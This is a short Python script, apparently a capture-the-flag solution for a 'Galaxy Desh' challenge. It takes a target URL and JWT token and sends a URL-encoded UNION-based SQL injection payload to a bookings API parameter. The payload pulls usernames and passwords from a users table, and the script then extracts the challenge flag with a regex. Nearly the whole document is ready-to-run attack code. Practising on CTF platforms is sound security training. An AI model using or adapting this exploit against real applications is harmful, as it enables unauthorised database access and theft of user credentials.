import requests
import argparse
import re
'''
Author:-  0xmr
Platform:- bugforge.io
Python Automation Script for Galaxy Desh Challenge.
Date:- 02-March-2026
'''


parser = argparse.ArgumentParser(
    prog='Galaxy_Desh', description='This is a python script for Galaxy Desh challenge...', epilog='Thank you !!'
)
parser.add_argument('--url', help="Target url", required=True)
parser.add_argument('--token', help="Bearer JWT token", required=True)
args = parser.parse_args()


target_url = f"{args.url}".strip()
target_path= "/api/bookings?status".strip()
payload = "'union select username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from users--".strip()
encoded_payload="%27%75%6e%69%6f%6e%20%73%65%6c%65%63%74%20%75%73%65%72%6e%61%6d%65%2c%70%61%73%73%77%6f%72%64%2c%33%2c%34%2c%35%2c%36%2c%37%2c%38%2c%39%2c%31%30%2c%31%31%2c%31%32%2c%31%33%2c%31%34%2c%31%35%2c%31%36%2c%31%37%2c%31%38%2c%31%39%2c%32%30%2c%32%31%2c%32%32%2c%32%33%2c%32%34%2c%32%35%2c%32%36%20%66%72%6f%6d%20%75%73%65%72%73%2d%2d"
print(f"[+] Found 26 Columns")
print(f"[+] Payload :- 'union select username,password,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26 from users--")

headers = {
    "Authorization": f"Bearer {args.token}"
}    

url = f"{target_url}/{target_path}={encoded_payload}"

session = requests.Session()
response = session.get(url, headers=headers)
raw = response.text.strip()
print("=" * 120)
print(f"Page COntent:-\n{raw}")
print("=" * 120)
flag = re.search(r'bug\{[^}]+\}', raw)
print("[+] Flag")
print("-" * 120)
print(f"{flag.group()}")
print("-" * 120)
